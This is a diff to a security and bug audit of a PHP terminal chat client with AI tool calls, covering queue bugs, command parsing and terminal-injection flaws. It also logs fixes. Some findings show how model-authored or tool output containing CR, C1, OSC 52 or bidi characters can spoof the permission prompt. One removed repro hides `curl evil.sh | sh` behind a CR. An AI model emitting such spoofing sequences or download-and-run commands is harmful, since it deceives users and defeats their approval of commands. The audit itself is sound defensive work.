@@ -15,20 +15,6 @@ Confidence labels:
 
 ## A. Turn state machine and queue
 
-### 15b-02 — After a double-Escape cancel, tool placeholders stay "running" forever; later results land on the wrong row
-- **Severity:** High · **Confidence:** Verified-by-repro (`r2_stale_placeholder.php`)
-- **Where:** The cancel arm at `src/Chat.php:2069-2080` touches nothing but adds `'history' => [...$this->history, Message::system('_Request cancelled._')]`. In `replaceToolRunningPlaceholder()` at `src/Chat.php:3981`, the first `pendingToolCallId === $event->toolCallId` match wins, searching from the top of history.
-- **Failure scenario:**
-  - Turn 1 starts a `Bash` tool (live `ToolStarted` → a "⠴ running: slow thing" row). The user presses Esc Esc. The row is never healed and spins in the transcript for the rest of the session. It is persisted to the transcript and healed only on resume, by `reviveTranscriptMessage`.
-  - Turn 2's tool has the same id. This is the norm with the DSML and MiniMax parsers (known #12, `dsml_call_0` repeats every response). Its `ToolFinished` replaces **turn 1's** row, and turn 2's own placeholder spins forever.
-  - Repro frame: `🔧 tool: Read ✓ ok — slow thing` sits above `system: _Request cancelled._`, and turn 2 shows `⠴ running: read readme`.
-  - This is new evidence for known #12. With unique ids the mis-attribution goes away, but the endless spinner stays.
-- **Fix:**
-  - In the cancel arm, map every `pendingToolCallId !== null` row to the same "interrupted" row `reviveCheckpointMessage()` builds.
-  - In `replaceToolRunningPlaceholder()`, search **backwards** (newest first).
-  - Also scope pending rows to the generation that created them, for example by recording the generation on the placeholder.
-- **Test:** Driven as in the repro: ToolStarted(id X) → Esc Esc. Assert no row has `pendingToolCallId`. Then start a new turn with ToolStarted(X) and ToolFinished(X). Assert that the newest row is the result and the turn-1 row is "interrupted".
-
 ### 15b-03 — UI-only rows go to the model: command output, mid-turn notices, background and runtime notices
 - **Severity:** Medium-High · **Confidence:** Verified-by-repro (`r1_wire.php`)
 - This is new evidence for known #22, which names only `/websearch`, and for #2: SGLang hoists System rows into message 0.
@@ -80,41 +66,7 @@ Confidence labels:
 - **Fix:** Route menu and shell commands through a Chat entry point that runs a command without touching `input`, such as `Chat::runCommand(string)`, or stash and restore the draft the way `releaseQueuedPrompts()` does. Refuse mid-turn **before** clearing.
 - **Test:** App + in-flight Chat + draft. Send `consumeShellCmd(new MenuSelectedMsg('Model','Switch model'))`. Assert that `chat->inputBuf` is unchanged.
 
-### 15b-06 — Switching session (tab, picker, palette New session) keeps the compaction thrash counter
-- **Severity:** Low · **Confidence:** Verified-by-reading
-- **Where:** `switchToSession()` at `src/Chat.php:1587-1604` and `handlePaletteNewSession()` at `:14163-14185` do not reset `consecutiveRefillCompactions`. `handleClearCommand()` does reset it, and its docblock gives the reason: leaving the count "would refuse the first ordinary prompt of a brand-new session".
-- **Scenario:** Session A trips the thrash breaker. The user switches to a large session B, which needs compaction, and is refused at once by `thrashBreakerRefusal()` because of A's history.
-- **Fix:** Reset `consecutiveRefillCompactions` (and `lastActivityAt`) in both functions.
-- **Test:** Set the counter to the threshold, `switchToSession`, and assert the counter is 0.
-
 ## B. Terminal injection and frame geometry
-
-### 15b-07 — Raw CR (`\r`) reaches the terminal from user/system rows, tool names and descriptions, and expanded tool output
-- **Severity:** High · **Confidence:** Verified-by-repro (`r9_toolinj.php`, `r4_app.php`, `r3_width.php`)
-- **Where:** `Sanitize::untrusted()` deliberately keeps TAB, LF and CR (`candy-core/src/Util/Sanitize.php:227-237`). The Renderer then emits the text without splitting on CR at these places:
-  - `src/Renderer.php:2979` (User) and `:2981` (System);
-  - `:3283` (tool name);
-  - `toolCallSuffix` (description);
-  - `:3292` + `renderToolBody()` `:3559-3561`. The expanded branch returns `$body` verbatim. The collapsed branch does split on `\r` in `collapseToolOutput()`.
-- **Repro:**
-  - `r9`: CR leaks for tool `name`, `desc`, expanded `result` and expanded `error`.
-  - `r4`: in the **hosted App frame**, row `│ │  user> visible\rHIDDEN-OVERWRITE │` and `system: note\rSPOOF` go to the wire. CR moves the cursor to column 0, and the rest of the row overwrites the left pane (Files) and the borders. The diff renderer's 1-line-per-row model is now wrong for that row.
-- **Realistic sources, non-malicious:**
-  - **Ctrl+O on any Bash result with a progress bar** (`git clone`, `npm install`, `composer`, `curl`);
-  - git stderr in `WorktreeManager` runtime notices (→ System rows);
-  - hook `additionalContext` (System);
-  - resumed transcripts.
-- **Malicious:** A tool or file output, or a model-authored `description`, can use CR to paint over the permission-relevant UI to its left.
-- **Fix:** Normalize `\r\n`→`\n` and lone `\r`→`\n` (or drop it) in the Renderer's `untrusted()` wrapper, so the one wrapper covers every path. Or add `Sanitize::untrustedForDisplay()` in candy-core that also maps CR.
-  - The wrapper alone is not enough. Some sites call `Sanitize::untrusted()` directly and would miss a wrapper-only fix: `wrapPermissionText()` (`src/Renderer.php:4677-4682`, see 15b-19) and `renderToolImage()`'s error line. The candy-core variant covers them all.
-- **Test:** For each row kind (user, system, tool name/description, expanded result and error), render content `a\rb` and assert `!str_contains($frame, "\r")`.
-
-### 15b-08 — UTF-8-encoded C1 controls (U+009B CSI, U+009D OSC, U+0090 DCS) pass every sanitizer and reach the frame
-- **Severity:** Medium · **Confidence:** Verified-by-repro that the bytes reach the frame (`md_inject.php`, `r9_toolinj.php`). Exploitability is Suspected: it depends on the terminal.
-- **Where:** `Ansi::strip()` treats a 0x80-0x9F byte as a control only when no lead byte precedes it. So `\xC2\x9B` (U+009B) survives `Sanitize::untrusted()` and CandyShine's markdown. It leaks on assistant markdown (`src/Renderer.php:3004`), tool name, description, args, diff, result and error.
-- **Scenario:** xterm and some other terminals interpret UTF-8-encoded C1 as controls, so `U+009B 2 J` acts as `CSI 2 J` and model or tool output can clear the screen or move the cursor. VTE- and kitty-family terminals are believed to ignore them; this is not verified.
-- **Fix:** This is a cross-lib change in candy-core `Sanitize::untrusted()`: also strip the codepoints U+0080-U+009F (`/\xC2[\x80-\x9F]/`). Apply the same sweep to CandyShine's text output.
-- **Test:** `Sanitize::untrusted("a\u{9b}2Jb") === 'a2Jb'`. A Renderer test asserting there is no `\xC2\x9B` in the frame for each row kind.
 
 ### 15b-09 — The chat status bar is never clipped to the terminal width
 - **Severity:** Medium (standalone `Chat` root) / Low (hosted App) · **Confidence:** Verified-by-repro (`r3b.php`, `r4_app.php`)
@@ -124,6 +76,7 @@ Confidence labels:
   - In-flight text (`⠴ thinking… · Esc Esc to cancel`) behaves the same way.
 - **Second geometry defect:** `$contentWidth = max(20, cols - 6)` at `:1294` makes the shell 26 cells wide on terminals under 26 columns. `r3_width.php` gives width 26 > 25 for every row kind at 25 columns.
   - The overlays share this floor. `r17_overlay_width.php`, with the status bar excluded: the palette, `/keys` and Ctrl+R history are 26 cells at 16 and 24 columns, and the slash popup is 18 cells at 16 columns. Their own clipping is otherwise correct: no overlay overran at 32 or 48 columns, and no frame was taller than its rows.
+- **Re-measured after the 15b-07 CR fix (`74ae88c2a`):** `r3_width.php` still reports every row kind at 25 columns as 26 cells (`width 26>25`), CR rows included. The CR fix removed the cursor motion, not this floor, so the second geometry defect is unchanged.
 - **Fix:** `Width::truncate($bar, $cols)` (ANSI-aware) at `:1907`. Drop or shorten `$processing` segments in priority order. Clamp `contentWidth` to `max(1, cols-6)`.
 - **Test:** For cols in {20, 30, 40}, assert every frame row satisfies `Width::string($row) <= $cols`.
 
@@ -143,15 +96,28 @@ Confidence labels:
   - Cache the streaming partial's settled-paragraph prefix.
 - **Test:** A performance guard: 300 markdown exchanges must render in under 50 ms after the first frame, or the markdown renderer must be called at most N times on an unchanged second frame (count it with a spy theme or renderer).
 
-## C. Commands and parsing
+### 15b-26 — candy-core `Width::wrap()` never terminates when a 2-cell cluster meets a 1-column budget
+- **Severity:** Medium (a hang) · **Confidence:** Verified-by-repro (`timeout 5 php -r '… Width::wrap("文", 1) …'` is killed at the deadline)
+- **Where:** `candy-core/src/Util/Width.php:295` (`wrap()`). Its hard-break loop cuts long tokens between grapheme clusters, but a cluster wider than the whole budget (a CJK character or a wide emoji at `$max = 1`) is never emitted, so the loop never advances.
+- **Reachability:** sugar-crush's permission modal calls it as `Width::wrap($clean, max(2, $cols))` (`src/Renderer.php:4769`, written for 15b-19), and the modal's inner width is floored at 20, so sugar-crush does not reach it today. Other callers can: `candy-shell/src/Command/PagerCommand.php:56` passes `max(1, $width)`, and `sugar-table/src/Column.php:251` passes the column width unclamped. A 1-column pager or table column fed CJK text hangs the process.
+- **Fix:** when the next cluster is wider than `$max`, emit it alone on its own row (an over-wide row is better than a hang), or replace it with a 1-cell placeholder. Either way, each pass of the loop must consume at least one cluster.
+- **Test:** `Width::wrap("文", 1)`, `Width::wrap("a文b", 1)` and `Width::wrap("👍🏽", 1)` each return within the test's time budget and contain every input cluster.
 
-### 15b-11 — Any prompt that starts with "mcp auth" is captured by the MCP command, including prose such as "mcp authentication fails…"
-- **Severity:** Low-Medium · **Confidence:** Verified-by-repro (`r5_cmdparse.php`)
-- **Where:** `src/Chat.php:8247` `if (str_starts_with($text, 'mcp auth'))` and the mid-turn variant at `:7178`. There is no word boundary.
-- **Repro:** `mcp authentication keeps failing on my server, why?` → backend calls 0. The transcript shows `✗ Unknown sub-command 'authentication'`, and the question never reaches the model. Mid-turn, the same prose is refused as a command and not queued.
-- **Note:** The bare `mcp auth` spelling is documented (`docs/COMMANDS.md:329`), but the prefix collision is not.
-- **Fix:** `preg_match('/^mcp\s+auth(\s|$)/', $text)` in both places.
-- **Test:** The prompt `mcp authentication…` dispatches to the backend. `mcp auth list` still routes to the handler.
+### 15b-28 — Bidi overrides and zero-width characters pass every sanitizer as ordinary text
+- **Severity:** Low · **Confidence:** Verified-by-reading
+- **Where:** `candy-core/src/Util/Sanitize.php` (`untrusted()`, `untrustedForDisplay()`, `visibleControls()`) and candy-shine `Renderer::stripControls()`. None of them touches U+202A–U+202E (embeddings and overrides), U+2066–U+2069 (isolates), U+200B–U+200D, U+2060 or U+FEFF.
+- **Failure scenario:** the 15b-07, 15b-08 and 15b-19 fixes close the cursor-motion and C1 routes, but a model-authored tool description, a tool result or a command shown in the permission modal can still carry U+202E. The terminal then displays the rest of the line reversed ("Trojan Source"), so text reads differently from what runs. Zero-width characters make two different names or paths look identical.
+- **Fix:** in the display policies, map these codepoints to a visible marker (`<U+202E>`, as `visibleControls()` already does for C1), at least in the permission modal and tool rows. `untrusted()` itself can keep them for paste fidelity.
+- **Test:** `visibleControls("rm \u{202E}txt.sh")` shows the marker, and a tool row rendered from the same text contains no raw U+202E.
+
+### 15b-29 — candy-shine `Renderer::stripControls()` does not strip lone raw 0x80–0x9F bytes
+- **Severity:** Low · **Confidence:** Verified-by-reading
+- **Where:** `candy-shine/src/Renderer.php:785-792`. The pattern is `/[\x00-\x08\x0b-\x1f\x7f]|\xC2[\x80-\x9F]/`, which removes the UTF-8-encoded C1 codepoints (the 15b-08 fix, `af42238fc`) but not a lone 8-bit C1 byte such as a bare `\x9B`.
+- **Failure scenario:** markdown text that carries a raw `\x9B` (8-bit CSI) passes CandyShine unchanged. Terminals that honour 8-bit C1 (for example xterm with 8-bit controls enabled) execute it. sugar-crush's own paths are covered, because candy-core `Sanitize::untrusted()` step 1 already removes every 0x80–0x9F byte outside a well-formed UTF-8 sequence before the text reaches CandyShine, so this matters for CandyShine's other consumers.
+- **Fix:** remove 0x80–0x9F bytes that are not part of a well-formed UTF-8 sequence, the way `Sanitize::untrusted()` step 1 does. A plain byte-class strip would corrupt valid multi-byte characters, whose continuation bytes fall in that range.
+- **Test:** CandyShine renders `"a\x9B2Jb"` without the `\x9B` byte, and still renders `→` and `👍` intact.
+
+## C. Commands and parsing
 
 ### 15b-12 — Session titling falls back to the main, tool-armed backend when there is no toolless title backend
 - **Severity:** Medium · **Confidence:** Verified-by-reading
@@ -164,6 +130,20 @@ Confidence labels:
   - With an `EngineBackend` fallback, the title job runs a full tool-enabled turn in a fork under the default bypass mode.
 - **Fix:** When `titleBackend` is null, skip titling (prompt suggestions already work this way), or use a backend that is guaranteed toolless.
 - **Test:** A Chat with `backend: RecBackend`, `titleBackend: null` and a session store. Submit the first prompt. Assert the backend is called exactly once.
+
+### 15b-24 — `/pane:x`, `/layout:x` and `/mcp:x` colon spellings are not handled
+- **Severity:** Low · **Confidence:** Verified-by-reading (found while fixing 15b-22)
+- **Where:** the `/pane`, `/layout` and `/mcp` arms in `src/Chat.php`. The 15b-22 fix (`0d094ff25`) moved the raw-text handlers onto `Chat::commandArgument()`, which accepts a space or `:` after the name. These three still split the whole draft on whitespace, so `/pane:dock left` arrives as the tokens `["/pane:dock", "left"]`.
+- **Failure scenario:** `CommandParser` routes `/pane:dock left` to the `/pane` arm (a name ends at `:`), but the arm reads its sub-command from the wrong token and answers with usage or an unknown sub-command. `docs/COMMANDS.md` now documents the limitation ("for those three use the space spelling"), so this is a consistency gap, not a silent wrong action.
+- **Fix:** tokenise `commandArgument()`'s result instead of the whole draft in these three arms, then drop the caveat from `docs/COMMANDS.md`.
+- **Test:** `/pane:dock left`, `/layout:<name>` and `/mcp:list` each behave exactly like their space spellings.
+
+### 15b-25 — The registry-derived command table shows `/rewind` as taking no argument
+- **Severity:** Low (docs) · **Confidence:** Verified-by-reading
+- **Where:** `src/Commands/CommandRegistry.php:282` (`CommandSpec::new('rewind', 'Restore chat state from an earlier checkpoint', 'Session')`, no argument hint), rendered into `docs/COMMANDS.md:304` as `| /rewind | ✓ | | — | … |`.
+- **Detail:** since 15b-22's fix, `/rewind` accepts an optional step count (`/rewind 3`, `/rewind:3`) and refuses anything else, as the prose below the table says. The table's *Takes* column is the row's own `argumentHint` and still shows `—`, so the table and the prose disagree.
+- **Fix:** give the registry row an argument hint such as `[n]` (it also shows in the slash popup) and update the table row to match.
+- **Test:** a doc assertion that every table row's *Takes* cell equals its registry row's `argumentHint` (or `—`), which would also have caught this one.
 
 ## D. Estimation, i18n, dormant wiring (lower priority)
 
@@ -216,19 +196,12 @@ Confidence labels:
   - Lay the strip out against `$chat->cols()`: clip each label to a per-tab budget, keep the current tab visible, and collapse the rest into `… +N`.
 - **Test:** A store with 8 long names and `cols=80`. Assert `Width::string(first row) <= 80`. Add a name with `\e]52;c;eA==\a` and assert no `\e]` appears in the frame.
 
-### 15b-19 — Latent: the permission modal wraps by bytes (invalid UTF-8) and keeps CR, so a command can display as something else
-- **Severity:** Medium (latent; not reachable today) · **Confidence:** Verified-by-repro on the helper (`r16_wordwrap_utf8.php`); reachability verified by reading
-- **Where:** `Renderer::wrapPermissionText()` at `src/Renderer.php:4677-4690` calls `Sanitize::untrusted()`, which keeps `\r`, then `wordwrap($line, $cols, "\n", true)`. `wordwrap` counts **bytes** and, with `cut=true`, splits inside multi-byte sequences.
-- **Reachability:** the modal is drawn only for a `PermissionRequestMsg`. Those come from Chat's local tool path (`beginToolCalls()`, which requires `$this->tools !== []`), and `Bootstrap::chat()` passes no `tools:`. Today the modal is dead in production, which is consistent with known #1. **The fix for known #1 will bring this modal back into use**, so these defects ship with that fix unless they are addressed first.
-- **Repro:**
-  - `echo 文件…` (80 CJK characters) at 40 columns gives `valid_utf8=NO`. Its first row is 4 bytes (`echo` plus a split codepoint), and the following rows are 24-26 cells, not 40.
-  - A path containing `ü` fails the same way.
-  - `curl evil.sh | sh #\recho 'hello world'` comes back with the `\r` intact. On the wire, CR returns the cursor to the modal's left edge, so `echo 'hello world'` is painted over the dangerous half. The user approves a command they did not see.
-- **Fix:**
-  - Map CR to `\n` (or `␍`) before wrapping, since a permission prompt must never hide text.
-  - Wrap with candy-core's ANSI- and cluster-aware `Width::wrapAnsi()`, or a `mb_`/grapheme loop, instead of `wordwrap()`.
-  - Make the gating rule for this modal "show every byte as visible text": render C0/C1 as caret notation, not stripped.
-- **Test:** `wrapPermissionText(str_repeat('文件', 40), 40)` is valid UTF-8 with every row `<= 40` cells. `wrapPermissionText("a\rb", 40)` contains no `\r`.
+### 15b-27 — The permission modal shows an empty value for a tool argument that is not valid UTF-8
+- **Severity:** Low · **Confidence:** Verified-by-reading
+- **Where:** `Message::describeToolCall()` at `src/Message.php:189-213`: `"{$key}: " . json_encode($rendered)` (and `json_encode($value) ?: ''` for non-string values), with no `JSON_INVALID_UTF8_SUBSTITUTE`.
+- **Failure scenario:** a model-authored argument containing one invalid byte (for example a Latin-1 `caf\xe9` in a Bash command) makes `json_encode()` return `false`, which concatenates as an empty string. The call is described as `Bash(command: )`, so a permission prompt built from this description asks the user to approve a command it does not show. Latent while the modal is unreachable (known #1), like 15b-19 was.
+- **Fix:** encode with `JSON_INVALID_UTF8_SUBSTITUTE | JSON_UNESCAPED_UNICODE`, and fall back to `Sanitize::visibleControls()` of the raw value rather than to `''`.
+- **Test:** `describeToolCall()` of a call with `["command" => "caf\xe9"]` contains `caf` followed by U+FFFD.
 
 ## F. Custom commands, session commands and persistence
 
@@ -267,58 +240,31 @@ Confidence labels:
   - Longer term, move persistence off `update()` (a debounced `Cmd`).
 - **Test:** Spy on the PDO (or count `PRAGMA data_version` bumps) across `saveTranscript()` of 50 new messages and assert one commit. A `/branch` performance guard: 800 messages under 300 ms.
 
-### 15b-22 — `/rewind <anything non-numeric>` silently rewinds one checkpoint; colon spellings reach handlers as a literal `:`
-- **Severity:** Low · **Confidence:** Verified-by-repro (`r20_rewind_args.php`)
-- **Where:**
-  - `handleRewindCommand()` at `src/Chat.php:12336`: `$stepsBack = (int) trim($afterRewind)`, and any value below 1 becomes 1.
-  - `dispatchCommand()` accepts `/name:args` (because `CommandParser` splits at `:`), but the handlers slice raw text by fixed offsets: `substr($inputText, 7)` and similar, `:12281` (`/rename`), `:16022` (`/theme`).
-- **Repro:**
-  - `/rewind last`, `/rewind help` and `/rewind -2` each **perform** a one-step rewind ("Rewound 1 messages to checkpoint 1"). They drop the latest answer from the live and persisted history, when they should print usage.
-  - `/rewind:all` does the same.
-  - `/rename:Release prep` stores the session name `":Release prep"`.
-- **Fix:**
-  - Validate with `ctype_digit()` and answer usage otherwise.
-  - Have handlers take `$parsed->args` (or the text after the parsed name and an optional `:`) instead of fixed `substr` offsets.
-- **Test:** `/rewind help` leaves `history` unchanged except for the usage echo. `/rename:foo` stores `foo`.
-
-### 15b-23 — Custom-command positional arguments: an apostrophe swallows the rest of the line, and empty quoted arguments shift `$N`
-- **Severity:** Low · **Confidence:** Verified-by-repro (inline `php -r` over `CommandParser`)
-- **Where:** `CommandParser::splitArgs()` at `src/CommandParser.php:99-141`. `'` always opens a quote, an unterminated quote silently runs to the end of the line, and `""` produces no token. `Chat::expandCustomCommand()` uses these tokens for `$1…$9`.
-- **Repro:**
-  - `/c fix don't touch main.php` gives `["fix","dont touch main.php"]`.
-  - `/c it's src/a.php src/b.php` gives `["its src/a.php src/b.php"]`.
-  - `/c "" second` gives `["second"]`.
-  - `$ARGUMENTS` is unaffected because it uses the raw text. This hits only the documented `$1` form (README example `Review $1 … Focus on: $ARGUMENTS`).
-- **Fix:** Treat `'` as a quote only at a token start, keep an unterminated quote literally, and emit empty quoted tokens.
-- **Test:** The three inputs above give `["fix","don't","touch","main.php"]`, `["it's","src/a.php","src/b.php"]` and `["","second"]`.
-
 ---
 
 ## Summary table (sorted by severity)
 
 | ID | Sev | Conf | Title |
 |---|---|---|---|
-| 15b-02 | High | Repro | Cancelled turn's "running" placeholders never healed; later same-id results land on the old row |
-| 15b-07 | High | Repro | Raw CR reaches the terminal (user/system rows, tool name/description, expanded tool output): pane overwrite and diff desync |
 | 15b-03 | Med-High | Repro | Command output, mid-turn notices and background/runtime notices go to the model as real turns |
 | 15b-10 | Med-High | Repro | Full-history markdown re-render every frame: 0.7 s/keystroke at 200 exchanges; 2.1 s/frame for a 200 KB streaming partial |
 | 15b-04 | Medium | Reading | UserPromptSubmit/SessionStart hooks run synchronously inside update() (up to 60 s freeze) |
 | 15b-05 | Medium | Repro | Menu and shell commands erase the draft, then claim "draft still in the box" |
-| 15b-08 | Medium | Repro (bytes) / Suspected (impact) | UTF-8 C1 controls (U+009B…) pass every sanitizer |
 | 15b-09 | Medium/Low | Repro | Status bar not clipped to cols; content width (and every overlay) floored at 20+chrome |
 | 15b-12 | Medium | Reading | Title job falls back to the main tool-armed or command backend (first prompt sent twice) |
-| 15b-19 | Medium (latent) | Repro (helper) | Permission modal wraps by bytes (invalid UTF-8) and keeps CR; goes live with the fix for known #1 |
 | 15b-20 | Medium | Repro | Custom-command `` !`…` `` blocks update() up to 10 s; timed-out grandchildren survive |
 | 15b-21 | Medium | Repro | `/branch` re-interns every message with one autocommitted INSERT each: 4.3 s freeze at 800 messages |
-| 15b-11 | Low-Med | Repro | Any prompt starting "mcp auth…" is swallowed by the MCP handler |
+| 15b-26 | Medium | Repro | candy-core `Width::wrap()` loops forever when a 2-cell cluster meets a 1-column budget (latent in sugar-crush; reachable via candy-shell pager, sugar-table) |
 | 15b-13 | Low-Med | Reading | Token proxy chars/4 underestimates CJK 3-6× |
 | 15b-17 | Low-Med | Repro | U+E002+n in model or tool text paints a copy of on-screen image n where the text chooses; Nerd Font glyphs blanked |
 | 15b-18 | Low-Med | Repro | Session tab strip unclipped (383 cells at 80 cols, standalone root) and unsanitized |
-| 15b-06 | Low | Reading | Session switch keeps the compaction thrash counter |
 | 15b-14 | Low | Reading | No i18n in sugar-crush |
 | 15b-15 | Low | Reading | Attachments dormant and dropped on the wire |
-| 15b-22 | Low | Repro | `/rewind help` (any non-numeric argument) performs a rewind; `/name:arg` reaches handlers as a literal `:` |
-| 15b-23 | Low | Repro | Positional `$N` splitting: an apostrophe swallows the rest of the line; `""` shifts the arguments |
+| 15b-24 | Low | Reading | `/pane:x`, `/layout:x`, `/mcp:x` colon spellings not handled (documented) |
+| 15b-25 | Low (docs) | Reading | Registry-derived command table shows `/rewind` *Takes* as `—` |
+| 15b-27 | Low (latent) | Reading | `describeToolCall()` shows an empty value for an invalid-UTF-8 argument |
+| 15b-28 | Low | Reading | Bidi overrides and zero-width characters pass every sanitizer |
+| 15b-29 | Low | Reading | candy-shine `stripControls()` keeps lone raw 0x80–0x9F bytes |
 
 **Checked and dropped:**
 - **Documented and intentional:** `/HELP`, `/clear all`, `/exit now` and unknown `/foo` fall through to the model (`docs/COMMANDS.md` "Two guards…"). The held queue after Esc Esc goes out after the next prompt (`InFlightInputQueueTest::testAQueueHeldThroughACancelGoesOutOnTheNextSettle`).
@@ -400,3 +346,11 @@ These findings were fixed on master after the audit. Their sections and table ro
 
 - **15b-01** UserPromptSubmit hook skipped on the parked 85% compaction route — fixed on master in `9c13a918e`. Residual: if the summary later refuses the turn (spend cap or the 95% tier), the hook has already seen the prompt.
 - **15b-16** A cloned repository's command-file description wrote OSC 52 and screen clears to the terminal on "/" — fixed on master in `cb3dee7fd`.
+- **15b-02** After a double-Escape cancel, tool placeholders stayed "running" forever and later same-id results landed on the old row — fixed on master in `855e42673` (the cancel arm maps every pending row to the "interrupted" row `reviveCheckpointMessage()` builds, with an error tool result under the same id; `replaceToolRunningPlaceholder()` and `finishToolCalls()` search newest first, and each result claims only its own rows). Residual: the healed row reuses the `INTERRUPTED_TOOL_CALL` text ("…interrupted by restart") even after a user cancel. A per-placeholder generation stamp was deferred; it is moot given the heal and the existing generation guards.
+- **15b-06** Switching session kept the compaction thrash counter — fixed on master in `b16819b13` (`switchToSession()` and palette New session share `sessionChangeResets()`; `lastActivityAt` goes to null).
+- **15b-07** Raw CR reached the terminal from user/system rows, tool names and descriptions and expanded tool output — fixed on master in `74ae88c2a` (new candy-core `Sanitize::untrustedForDisplay()` maps CRLF and lone CR to LF; the Renderer's `untrusted()` wrapper uses it, and one-line rows go through a new `oneLine()` before truncation).
+- **15b-08** UTF-8-encoded C1 controls passed every sanitizer — fixed on master in `af42238fc` (candy-core `Sanitize::untrusted()` and candy-shine `Renderer::stripControls()` remove `\xC2[\x80-\x9F]`). Still open nearby: lone raw C1 bytes in candy-shine (15b-29), and bidi and zero-width characters (15b-28).
+- **15b-11** Any prompt starting "mcp auth" was captured by the MCP command — fixed on master in `373e7d953` (both sites use `isBareMcpAuthCommand()`, `/^mcp\s+auth(?:\s|$)/`; `docs/COMMANDS.md` states the whole-word rule).
+- **15b-19** The latent permission modal wrapped by bytes and kept CR — fixed on master in `e4fd37010` (new candy-core `Sanitize::visibleControls()` renders every control byte visibly in caret or `<U+…>` notation; CR maps to LF, zone sentinels are spelled out, and the text wraps by cells with `Width::wrap()`). Found while fixing it: `Width::wrap()` hangs at a 1-column budget (15b-26), and an invalid-UTF-8 argument is described as empty (15b-27).
+- **15b-22** `/rewind help` (any non-numeric argument) performed a rewind, and `/name:arg` reached handlers with a literal `:` — fixed on master in `0d094ff25` (`/rewind` accepts only an empty or `ctype_digit` count ≥ 1; the raw-text handlers take `Chat::commandArgument()`, which drops one space or `:` separator). Residual: `/pane`, `/layout` and `/mcp` still split the whole draft on whitespace (documented in `docs/COMMANDS.md`; 15b-24), and the command table's `/rewind` *Takes* column still shows `—` (15b-25).
+- **15b-23** Positional `$N` splitting: an apostrophe swallowed the rest of the line and `""` shifted the arguments — fixed on master in `0147c5f7a` + `1173b2ada` (a quote opens a span only at a token start, an unterminated quote stays literal, and an empty quoted span yields an empty token). Residual: `/model ""` now answers "Could not switch to provider ''" instead of opening the palette, because the user typed an explicit empty name.
